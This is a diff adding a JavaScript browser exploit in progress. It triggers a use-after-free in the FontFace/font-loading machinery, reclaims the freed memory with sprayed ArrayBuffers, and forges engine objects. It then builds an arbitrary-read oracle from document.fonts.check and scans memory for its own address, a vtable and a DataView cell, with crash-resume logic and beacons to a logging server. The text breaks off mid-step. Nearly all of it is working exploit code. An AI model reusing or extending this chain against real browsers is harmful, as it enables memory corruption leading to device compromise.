@@ -1,0 +1,1195 @@
+
+'use strict';
+var SKIPJ=-1;
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+/* --- beacon infrastructure (sync-XHR POST to host.py's do_POST sink; every
+ * beacon lands in host-beacons.log before a crash. V688: prefix renamed so
+ * runs are separable from V687/P691 logs and never share cache keys. */
+function post(m){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/beacon/V31-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);
+    x.send('');
+  }catch(e){}
+}
+function b(m){try{O.textContent+='\n'+m;}catch(e){}post(m);}
+function bs(m){post(m);}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+/* --- query params --- */
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+function qhex(n,d){var m=new RegExp('[?&]'+n+'=([0-9a-fA-F]+)').exec(location.search);return m?parseInt(m[1],16):d;}
+var K=qint('k',32), RT=qint('rt',0), PK=qint('pk',9), PW=qint('pw',80), DL=qint('dl',0);
+var GT=qint('gt',0), SI=qint('si',0), RV=qint('rv',6), KC=qint('kc',1), BK=qint('bk',1);
+var MT=qint('mt',1), MP=qint('mp',0), IVP=qint('ivp',0);
+var CLI=qint('cli',184);
+var VB=(function(){var m=/[?&]vb=([0-9a-f]+)/.exec(location.search);return m?parseInt(m[1],16):0x18;})();
+var SV=(function(){var m=location.search.match(/[?&]sv=([^&]*)/);return m?decodeURIComponent(m[1]):'italic';})();
+var CTL=qint('ctl',0), AUTO=qint('auto',0);
+var LK=qint('lk',1);
+/* V688 optional manual JSDataView candidate cell (hex, no 0x needed) */
+var DVQ=(function(){var m=/[?&]dv=([0-9a-fA-F]+)/.exec(location.search);return m?BigInt('0x'+m[1]):0n;})();
+
+var SIZE=192, fired=false, faces=null, RTT=0;
+
+/* --- primitives --- */
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+
+/* --- V688 marker buffers (allocated BEFORE the UAF start, never freed,
+ * contents frozen after marker init). V11: a SPRAY of 32 identical 0x100-byte
+ * marker buffers (buffer[0] keeps the original view contract for the ?dv=
+ * certification). Each carries the six original marker qwords PLUS the
+ * PH3-pattern qword 0x0000200000001000 at +0x88 and +0xB8 — findable with
+ * the proven 4-way oracle test (chk 0x1000/0xFFF/0x2000/0x2001). */
+var __v688buf=null,__v688view=null,__v688hold=[],__v688spray=[],__v688views=[];
+function dvSetBig(v,off,val){
+  if(typeof v.setBigUint64==='function'){v.setBigUint64(off,val,true);return;}
+  var lo=Number(val&0xFFFFFFFFn)>>>0,hi=Number((val>>32n)&0xFFFFFFFFn)>>>0;
+  v.setUint32(off,lo,true);v.setUint32(off+4,hi,true);
+}
+function dvGetBig(v,off){
+  if(typeof v.getBigUint64==='function')return v.getBigUint64(off,true);
+  var lo=BigInt(v.getUint32(off,true)>>>0),hi=BigInt(v.getUint32(off+4,true)>>>0);
+  return lo|(hi<<32n);
+}
+(function initV688Markers(){
+  try{
+    var PAT=0x0000200000001000n;
+    for(var si=0;si<32;si++){
+      var ab=new ArrayBuffer(0x100);
+      var full=new DataView(ab);
+      dvSetBig(full,0x18,0x55AA33CC0FF0E11En);  /* marker C (view-0x08) */
+      dvSetBig(full,0x20,0x13579BDF02468ACEn);  /* marker A (view data start) */
+      dvSetBig(full,0x58,0x2468ACE013579BDFn); /* marker B (view+0x38) */
+      dvSetBig(full,0x60,0x0D15EA5EC001D00Dn); /* marker D */
+      dvSetBig(full,0x00,0xDEADBEEFCAFEBABEn);  /* marker E */
+      dvSetBig(full,0xF8,0x0123456789ABCDEFn);  /* marker F */
+      dvSetBig(full,0x90,PAT);                  /* V15: 0x88/0xB8 aliased the SELF scan's
+                                                  +0x38 probe (0x88-0x38=0x50, on-grid) → fake
+                                                  SELF=marker+0x50 killed the walk (v12-v14).
+                                                  0x90/0xC0 put the alias targets off-grid
+                                                  (0x58/0x88 mod 16 = 8) — no cross-matches. */
+      dvSetBig(full,0xC0,PAT);
+      dvSetBig(full,0x48,0xAA00000000n|BigInt(si)); /* V16: buffer index tag — identifies which
+                                                  spray[i] lives at a given address */
+      /* V14 calibration bytes. Oracle semantics (device-decoded across
+       * PH3/CAL1/CALA): chk(c)=TRUE iff A<=c<=B where (A,B)=the two uint32s
+       * at the probe address; inverted (A>B) => always FALSE. A JSDataView
+       * cell exposes these probeable windows:
+       *   +0x14: (V.b4, 0x40)  — V.b4 = band byte-4 (dynamic, from MBUF) — PRIMARY, both edges pinned
+       *   +0x1C: (0, 0x20)     — length-tail + byteOffset — SECONDARY, B edge pinned
+       *   +0x18: (0x40, 0)     — inverted => all-F — TERTIARY filter
+       * +0x98 is planted DYNAMICALLY after MBUF is known (boot-proof); the
+       * others are V-independent constants. */
+      dvSetBig(full,0x98,0x0000004000000010n);   /* placeholder — overwritten at runtime with V.b4 */
+      dvSetBig(full,0xA0,0x0000000000000040n);   /* +0x18 window: qword 0x40 */
+      dvSetBig(full,0xA8,0x0000002000000000n);   /* +0x1C window: bytes 00 00 00 00 20 00 00 00 */
+      var vw=new DataView(ab,0x20,0x40);         /* every buffer gets a view: any of the 32 cells is a valid addrof target */
+      __v688views.push(vw);
+      __v688spray.push(ab);
+      if(si===0){__v688buf=ab;__v688view=new DataView(ab,0x20,0x40);__v688hold=[ab,__v688view,full];}
+    }
+    window.__v688={buf:__v688buf,view:__v688view,full:new DataView(__v688buf),hold:__v688hold,spray:__v688spray,views:__v688views};
+  }catch(e){__v688buf=null;__v688view=null;}
+})();
+
+/* --- localStorage reset ---
+ * reset=1 clears ALL probe state (p691*, v687*, v688*).
+ * soft=1 clears only this probe's scan cursor/pass/phase/base (fresh scan,
+ * chain caches kept). V687's own cursor keys are untouched by soft so
+ * switching back to the old probe is possible. */
+if(/[?&]reset=1/.test(location.search)){
+  try{var ks=Object.keys(localStorage);for(var ri=0;ri<ks.length;ri++){var kk=ks[ri];if(kk.indexOf('p691')===0||kk.indexOf('v687')===0||kk.indexOf('v688')===0)localStorage.removeItem(kk);}}catch(e){}
+  b('RESET-FULL');document.body.innerHTML='<p style="font:700 26px monospace">v688 reset</p>';
+}
+else if(/[?&]soft=1/.test(location.search)){
+  try{['off','dir','exp'].forEach(function(sk){localStorage.removeItem('v688_'+sk);});}catch(e){}
+  b('SOFT');document.body.innerHTML='<p style="font:700 26px monospace">sift state cleared</p>';
+}
+else { b('VER-2'); b('BOOT-'+UID+',ctl='+CTL); }
+
+/* --- spray + UAF trigger --- */
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{window.__alive=[vf];}catch(e){}   /* keep the JS wrapper alive while the engine frees the backend */
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    if(!CTL){try{fs.remove();fs.textContent='';}catch(e){}try{document.fonts.delete(this);}catch(e){}}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    /* size-ladder buffers are reclaim pressure ONLY — they are NOT in __sp
+     * (chain geometry assumes 192B). */
+    window.__ladder=[];
+    var LAD=[64,96,128,160,224,256,320,384,512,768,1024,2048];
+    for(var la=0;la<LAD.length;la++)for(var lb=0;lb<8;lb++)window.__ladder.push(new Uint8Array(new ArrayBuffer(LAD[la])));
+    try{document.fonts.check('1em v1');}catch(e){}   /* consumption — critical on this boot */
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(tryPhase,60);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* multi-timing leak retry: on this boot the reclaim lands at a variable
+ * delay; scan at the usual cadence before declaring NOLEAK. Also beacons the
+ * fired/alive state so a NOLEAK distinguishes "getter never fired" from
+ * "reclaim missed". */
+var leakTries=0,RETRY=[0,80,260,300,300];
+function leakHit(){
+  for(var i=0;i<window.__sp.length;i++){if(le(window.__sp[i],0x58)>0x1000000000n)return true;}
+  return false;
+}
+function tryPhase(){
+  if(faces&&window.__sp&&leakHit()){b('LEAK-CONFIRMED-'+leakTries);setTimeout(phase,PW);return;}
+  if(leakTries<RETRY.length-1){b('SCAN-RETRY-'+leakTries+'-fired-'+(fired?1:0)+'-sp-'+((window.__sp&&window.__sp.length)||0));leakTries++;setTimeout(tryPhase,RETRY[leakTries]);return;}
+  b('L1-0x0');b('L2-0x0');b('NOLEAK');verd('bad','NOLEAK');
+}
+
+/* --- main analysis chain --- */
+function phase(){
+  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null,cands=[];
+  if(RT>0){RTT=setTimeout(function(){location.href=location.href.replace(/([?&])rt=\d+/,'$1rt='+(RT-1));},30000);}
+
+  /* Step 1: hit detection + leak L1/L2 */
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);cands.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
+  }
+  if(rawL){L1=rawL[0];L2=rawL[1];}
+  b('L1-'+hex(L1));b('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');return;}
+
+  /* Step 2: initial forge — set refcount, copy L2, clear status */
+  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
+  b('FORGED-'+bufs.length);
+
+  /* Step 3: re-add faces, find oracle face (setTimeout chain) */
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+
+        /* set ranges count/capacity on all hit buffers */
+        for(var is=0;is<bufs.length;is++){bufs[is][0][0x28]=1;bufs[is][0][0x2C]=1;}
+
+        /* --- oracle functions --- */
+        var self=0n,selfFound=false;
+
+        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        function boundary(tgt){
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF,res=-1;
+          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
+          return res;
+        }
+
+        /* --- style-read mechanism --- */
+        function forgeRead(daddr,dlen){
+          for(var ib2=0;ib2<window.__sp.length;ib2++){
+            var vb2=window.__sp[ib2];if(!vb2)continue;
+            if(SKIPJ>=0&&ib2===SKIPJ)continue;
+            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
+            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
+            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
+            put32(vb2,0x70,4);
+            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
+            if(selfFound)put64(vb2,0x7A,self+0x90n);
+            put32(vb2,0x90,3);put32(vb2,0x94,72);
+            if(selfFound)put64(vb2,0x98,self+0x30n);
+          }
+        }
+        function dec(s,lim){
+          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
+          while(k<e&&by.length<lim){var ch=s.charAt(k);
+            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+            else{by.push(s.charCodeAt(k));k++;}}
+          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+        }
+        function readStyle(){
+          if(zi<0)return '';
+          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
+        }
+        function readLeHex(hexStr,off){
+          var s=hexStr.slice(off*2,off*2+16);
+          if(!/^[0-9a-f]{16}$/.test(s))return 0n;
+          return BigInt('0x'+s.match(/../g).reverse().join(''));
+        }
+
+        /* --- Step 4: oracle validation --- */
+        var t1=-1,l2i=-1;
+        b('DIAG-bufs='+bufs.length+',fam='+fam+',zi='+zi);
+        for(var q8=0;q8<bufs.length;q8++){
+          L1=bufl1[q8];L2=bufs[q8][1];
+          var dCnt=bufs[q8][0][0x28],dCap=bufs[q8][0][0x2C];
+          b('DIAG-q'+q8+'-L2='+hex(L2)+',cnt='+dCnt+',cap='+dCap);
+          setR(L2+0x07n);
+          var dc0=chk(0),dc1=chk(0x41),dc2=chk(0x100);
+          b('DIAG-q'+q8+'-chk0='+dc0+',chk41='+dc1+',chk100='+dc2);
+          var d20=hex(le(bufs[q8][0],0x20));
+          b('DIAG-q'+q8+'-ptr20='+d20);
+          t1=boundary(L2+0x07n);
+          if(t1>=0){l2i=q8;break;}
+        }
+        if(l2i>0)b('L2SEL-'+l2i);
+        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
+
+        var oracleAlive=(t1>=0);
+        if(!oracleAlive){
+          b('A-DEAD');
+          for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
+            vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+            vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+        }
+        /* readStyle() without selfFound poisons the WeakPtrImpl backing,
+           causing all subsequent face.style calls to return "normal" instead
+           of binary data from the forged address. */
+
+        var t2=-1,c0=false;
+        if(oracleAlive){
+          b('HIGH-0x'+t1.toString(16));
+          t2=boundary(L2+0x06n);
+          if(t2<0){b('B-DEAD');}else{b('B2-0x'+(t2&0xFF).toString(16));}
+          setR(L2+0x05n);
+          c0=chk(0);
+          b('B0CLASS-'+(c0===true?'lo-hi':(c0===false?'mid':'?')));
+        }
+
+        /* --- Step 5: Phase 2 — Client scan --- */
+        var B2=BigInt((t2>=0)?(t2&0xFF):Number((L2>>16n)&0xFFn));
+        var B2L=Number((L2>>16n)&0xFFn);
+        var fromExp=BigInt(B2L)|0x100000n;
+        var B0s=(c0===false)?[0x10,0x20,0x30,0x40,0x50,0x60,0x70]:[0x00,0x80,0x90,0xa0,0xb0,0xc0,0xd0,0xe0,0xf0];
+        var found=0n,ntry=0;
+        b('PH2-START-b0='+B0s.length);
+
+        try{var pv=BigInt('0x'+(localStorage.getItem('v688_cli')||'0'));
+          if(pv>0x1000000000n){setR(pv+0x0Bn);if(chk(0x1000)===true&&chk(0xFFF)===false){found=pv;b('CLIENT-CACHED-0x'+pv.toString(16));}}}catch(e){}
+
+        var b1L=Number((L2>>8n)&0xFFn);
+        var ST=null;try{ST=JSON.parse(localStorage.getItem('v688_st')||'null');}catch(e){}
+        var startI=0;
+        if(ST&&ST.B2===Number(B2)&&ST.b1L===b1L&&ST.c0===(c0===false)){
+          startI=(ST.i|0);if(startI>4)startI-=4;b('PH2-RESUME-'+startI);
+        }else{b('PH2-FRESH');startI=0;try{localStorage.setItem('v688_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:0}));}catch(e){}}
+
+        var B1s=[];for(var q1=0;q1<256;q1++)B1s.push(q1);
+        B1s.sort(function(x,y){return Math.abs(x-b1L)-Math.abs(y-b1L);});
+
+        if(found===0n&&oracleAlive){
+          for(var i5=0;i5<B0s.length;i5++){
+            var brk=false;
+            for(var q2b=0;q2b<256;q2b++){
+              var b1=B1s[q2b];
+              var cand=BigInt(B0s[i5])|(BigInt(b1)<<8n)|(B2<<16n)|(0x10n<<32n);
+              if(ntry<startI){ntry++;continue;}
+              setR(cand+0x0Bn);ntry++;
+              if((ntry&7)===0){try{localStorage.setItem('v688_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:ntry}));}catch(e){}}
+              if(chk(0x1000)===true&&chk(0xFFF)===false){
+                setR(cand+0x0An);
+                var s1=chk(Number(fromExp&0x1FFFFFn));
+                b('CAND-0x'+cand.toString(16)+',s1='+s1);
+                if(s1===true){found=cand;brk=true;break;}
+              }
+              if((ntry%64)===0)b('PH2-'+ntry);
+            }
+            if(brk)break;
+          }
+        }
+        b('PH2-END-ntry='+ntry);
+        if(!found){
+          if(oracleAlive){b('NOCLIENT');try{localStorage.removeItem('v688_st');}catch(e){}verd('bad','NOCLIENT');return;}
+          /* A-DEAD is the NORMAL path (all morning sessions ran it): the
+           * boundary read at L2+7 fails but chk() is alive — PH3 finds self
+           * via the planted 0x1000/0x2000 pattern. Do NOT return here. */
+          b('PH2-SKIP-DEAD');
+        }else{
+          try{localStorage.removeItem('v688_st');}catch(e){}
+          try{localStorage.setItem('v688_cli',found.toString(16));}catch(e){}
+          b('CLIENT-0x'+found.toString(16));
+        }
+
+        /* --- Step 6: Phase 3 — Self scan --- */
+        for(var ip=0;ip<bufs.length;ip++){var vp=bufs[ip][0];
+          vp[0x38]=0x00;vp[0x39]=0x10;vp[0x3A]=0x00;vp[0x3B]=0x00;
+          vp[0x3C]=0x00;vp[0x3D]=0x20;vp[0x3E]=0x00;vp[0x3F]=0x00;}
+
+        if(!selfFound&&found){
+          setR(found+0x48n);
+          if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+            self=found+0x10n;selfFound=true;b('SELF-DER-0x'+self.toString(16));
+          }
+        }
+
+        /* --- cached-self fast path: SELF is stable across sessions on a boot
+         * (morning log: 0x1000380000 x7). Try the cached address + 16K
+         * neighbors first — the 4-way pattern (planted bytes 0x1000/0x2000 in
+         * the hit buffer) is the verification. CRASH ESCAPE: a stale cache
+         * from a previous boot can point at unmapped memory → the probe
+         * crashes the session. v688_selftries counts attempts; after 3
+         * failed/crashed attempts the cache is bypassed until a new SELF
+         * overwrites it. */
+        if(!selfFound){
+          try{
+            var cs=BigInt('0x'+(localStorage.getItem('v688_self')||'0'));
+            var csT=parseInt(localStorage.getItem('v688_selftries')||'0',10);
+            if(cs>0x1000000000n&&csT<3){
+              try{localStorage.setItem('v688_selftries',String(csT+1));}catch(e2){}
+              var cs5=[cs,cs+0x4000n,cs-0x4000n,cs+0x8000n,cs-0x8000n];
+              for(var ci5=0;ci5<cs5.length;ci5++){
+                var csc=cs5[ci5];
+                if(csc<=0x1000000000n)continue;
+                setR(csc+0x38n);
+                if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                  self=csc;selfFound=true;b('SELF-CACHED-0x'+csc.toString(16));break;
+                }
+              }
+            }
+          }catch(e){}
+        }
+
+        if(!selfFound){
+          var b2Ref=(found>0n)?Number((found>>16n)&0xFFn):Number((L2>>16n)&0xFFn);
+          var b4Ref=(found>0n)?Number((found>>32n)&0xFFn):Number((L2>>32n)&0xFFn);
+          var B4s=[b4Ref];
+          var b4low=[];for(var ql=0x01;ql<=0x07;ql++)b4low.push(ql);
+          var b4all=b4low.concat([0x10,0x08]);
+          for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);
+          for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
+          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}
+
+          /* V9 FULL-B1 GRID: the old grid covered b1 ∈ [0,0x7E] only — HALF
+           * the byte. Morning SELF had b1=0x00 (page-start chunk, lucky);
+           * boots B-E scanned clean and never found SELF because its b1 was
+           * likely > 0x7E — structurally invisible. Full grid: b2 window ×
+           * b1 ∈ [0,0xFF] × b0 (16-aligned) = 4096/window. ~905K tries over
+           * the safe band ≈ 9s at this boot's ~100K/sec scan rate — fits in
+           * one session lifetime (~14s deferred-crash ceiling). */
+          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
+          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
+
+          
+          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);
+
+          var dead=[];try{dead=JSON.parse(localStorage.getItem('v688_dead')||'[]');}catch(e){}
+          var s3=null;try{s3=JSON.parse(localStorage.getItem('v688_s3')||'null');}catch(e){}
+          /* 'dead' resume key is session-INDEPENDENT (L2 changes every session
+           * so the old L2-based key never matched — scans always restarted at
+           * 0). The b2Ref ordering is stable (L2 byte2 is 0x7e across
+           * sessions), so cross-session resume converges under crash churn. */
+          var resumeKey=(found>0n)?('cli'+found.toString(16)):'dead3';
+          var PH3_BOUND=2200000;  /* ~4 regions: b4Ref, 0x01, 0x02, 0x03 — the two plausible SELF families first */
+          /* CRASH-TUNNELING RESUME: there is a persistent unmapped hole at
+           * b2-window ~220 (~449K, observed on boots B and C) — the engine
+           * dereferences sc+0x38 there → SIGSEGV. Resume one FULL WINDOW
+           * past the last saved cursor: the window the previous session died
+           * in is never probed again. Each crash advances the cursor; the
+           * scan tunnels through any wall in ~1 session per bad window. */
+          var st3=0;
+          if(s3&&s3.cli===resumeKey){st3=(s3.i|0)+4096;   /* V9 window size */if(st3>=PH3_BOUND){st3=0;}else b('PH3-ADVANCE-'+st3);}
+          var n3=0,WSZ=(0x100*16);   /* V9: 256 b1 x 16 b0 = 4096 per window */
+          b('PH3-START-b4='+B4s[0]+'-bound='+PH3_BOUND);
+
+          var ph3HitBound=false,nullStreak=0;
+          for(var i8=0;i8<B4s.length&&!selfFound&&!ph3HitBound;i8++){
+            for(var i7=0;i7<b2s.length&&!selfFound;i7++){
+              var winB2=b2s[i7];
+              if(dead.indexOf(B4s[i8]*1000+winB2)>=0){n3+=WSZ;continue;}
+              if(st3>n3+WSZ){n3+=WSZ;continue;}
+              if(n3>=PH3_BOUND){ph3HitBound=true;b('PH3-BOUND-'+n3);break;}
+              for(var q7=0;q7<0x100&&!selfFound;q7++){
+                for(var i6=0;i6<b0a.length&&!selfFound;i6++){
+                  var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(winB2)<<16n)|(BigInt(B4s[i8])<<32n);
+                  if(n3<st3){n3++;continue;}
+                  setR(sc+0x38n);n3++;
+                  if((n3&31)===0){try{localStorage.setItem('v688_s3',JSON.stringify({cli:resumeKey,i:n3}));}catch(e){}}
+                  if(n3>=1048576&&!window.__r0done){window.__r0done=true;b('PH3-R0-CLEAN-'+n3);}   /* V9: 256 win x 4096 */
+                  /* true pathology detector: chk() throwing (null) under
+                   * engine distress can never match — abort instead of
+                   * scanning the whole space (IIFJUV 449K futile case) */
+                  var r1=chk(0x1000);
+                  if(r1===null){nullStreak++;if(nullStreak>200){b('PH3-CHKBROKEN-'+n3);ph3HitBound=true;break;}}else nullStreak=0;
+                  if(r1===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                    self=sc;selfFound=true;
+                  }
+                  if((n3%2048)===0)b('PH3-'+n3);
+                }
+              }
+            }
+          }
+        }
+
+        if(!selfFound){b('NOSELF');verd('bad','NOSELF');return;}
+        b('SELF-0x'+self.toString(16));
+        try{localStorage.setItem('v688_self',self.toString(16));localStorage.setItem('v688_selftries','0');}catch(e){}
+        if(RTT){clearTimeout(RTT);RTT=0;}
+        try{localStorage.removeItem('v688_s3');localStorage.removeItem('v688_dead');}catch(e){}
+
+        for(var iv=0;iv<window.__sp.length;iv++){
+          if(le(window.__sp[iv],0x58)>0x1000000000n)continue;
+          var wv=window.__sp[iv],mk=0x1000+iv;
+          wv[0x40]=0;wv[0x41]=0;wv[0x42]=0;wv[0x43]=0;
+          wv[0x44]=mk&0xFF;wv[0x45]=(mk>>8)&0xFF;wv[0x46]=0;wv[0x47]=0;
+        }
+
+        /* --- Step 7: VTAB search --- */
+        var VTAB=0n;
+        for(var sv=1;sv<=256&&VTAB===0n;sv++){
+          var cd=self-BigInt(sv*64);
+          setR(cd);
+          if(chk(0x1000)===true&&chk(0x1001)===false){
+            var jj=Number(boundary(cd))-0x1000;
+            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;b('VTAB-0x'+cd.toString(16)+'-j'+jj);break;}
+          }
+        }
+        if(VTAB===0n){
+          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
+            var cu=self+BigInt(sv2*64);
+            setR(cu);
+            if(chk(0x1000)===true&&chk(0x1001)===false){
+              var jj2=Number(boundary(cu))-0x1000;
+              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;b('VTAB-0x'+cu.toString(16)+'-j'+jj2);break;}
+            }
+          }
+        }
+        if(VTAB===0n)b('VTAB-NONE');
+
+        /* ==== V11 STEP 7.5: marker-buffer scan (chk alive, pre-DEL) ====
+         * 32 identical marker buffers sprayed at init, each with the PH3
+         * pattern qword at +0x88 and +0xB8. Try cached-B first, then a
+         * 0x100-aligned fast pass over the mapped band INTERIOR (b2
+         * 0x20-0xDB — never the edges: unmapped → crash), auto-upgrade to
+         * the full 16B grid via v688_mfull if the fast pass is clean. */
+        var MBUF=0n;
+        var mRef=Number((L2>>16n)&0xFFn), m4=Number((L2>>32n)&0xFFn);
+        function mPat(a){setR(a);return chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false;}
+        try{
+          var mB=BigInt('0x'+(localStorage.getItem('v688_buf')||'0'));
+          if(mB>0x1000000000n&&mPat(mB+0x90n)&&mPat(mB+0xC0n)){MBUF=mB;bs('MBUF-CACHED-0x'+mB.toString(16));}
+          if(MBUF===0n)try{localStorage.removeItem('v688_buf');}catch(e2){}
+        }catch(e){}
+        if(MBUF===0n){
+          var mFull=false;try{mFull=(localStorage.getItem('v688_mfull')==='1');}catch(e){}
+          var m2s=[];for(var mq=0x20;mq<=0xDB;mq++)m2s.push(mq);
+          m2s.sort(function(x,y){return Math.abs(x-mRef)-Math.abs(y-mRef);});
+          var m1s=[];for(var mq1=0;mq1<256;mq1++)m1s.push(mq1);
+          var m0s=mFull?[0,16,32,48,64,80,96,112,128,144,160,176,192,208,224,240]:[0];
+          bs('MSCAN-START-full='+(mFull?1:0)+'-n='+(m2s.length*m1s.length*m0s.length));
+          var mN=0;
+          for(var mi=0;mi<m2s.length&&MBUF===0n;mi++){
+            for(var mj=0;mj<m1s.length&&MBUF===0n;mj++){
+              for(var mk=0;mk<m0s.length;mk++){
+                var mc=BigInt(m0s[mk])|(BigInt(m1s[mj])<<8n)|(BigInt(m2s[mi])<<16n)|(BigInt(m4)<<32n);
+                mN++;
+                if(mPat(mc+0x90n)){
+                  if(mPat(mc+0xC0n)){MBUF=mc;break;}
+                }
+                if((mN%16384)===0)bs('MSCAN-'+mN);
+              }
+            }
+          }
+          if(MBUF===0n){
+            bs('MSCAN-CLEAN-n='+mN);
+            try{if(!mFull)localStorage.setItem('v688_mfull','1');}catch(e){}
+          }else{
+            bs('MBUF-0x'+MBUF.toString(16)+'-n='+mN);
+            try{localStorage.setItem('v688_buf',MBUF.toString(16));}catch(e){}
+          }
+        }
+
+        /* ==== V14 STEP 7.6: JSDataView cell scan (calibrated, pre-DEL) ====
+         * Semantics (device-decoded): chk(c)=T iff A<=c<=B; inverted => all-F.
+         * Cell windows: +0x14=(V.b4,0x40) PRIMARY; +0x1C=(0,0x20) SECONDARY;
+         * +0x18=(0x40,0) inverted all-F TERTIARY. +0x98 is planted
+         * dynamically from MBUF (boot-proof). Collect up to 4 candidates;
+         * Step 9 fully verifies each (header + 6 markers). */
+        var CELLC=[];
+        function cResp(a,cps){setR(a);var r=[];for(var ck=0;ck<cps.length;ck++)r.push(chk(cps[ck]));return r;}
+        function cTup(r){var s='';for(var ck2=0;ck2<r.length;ck2++)s+=(r[ck2]===null?'n':(r[ck2]?'T':'F'));return s;}
+        function cMatch(a,tup,cps){var r=cResp(a,cps);for(var ck3=0;ck3<4;ck3++){if(r[ck3]!==tup[ck3])return false;}return true;}
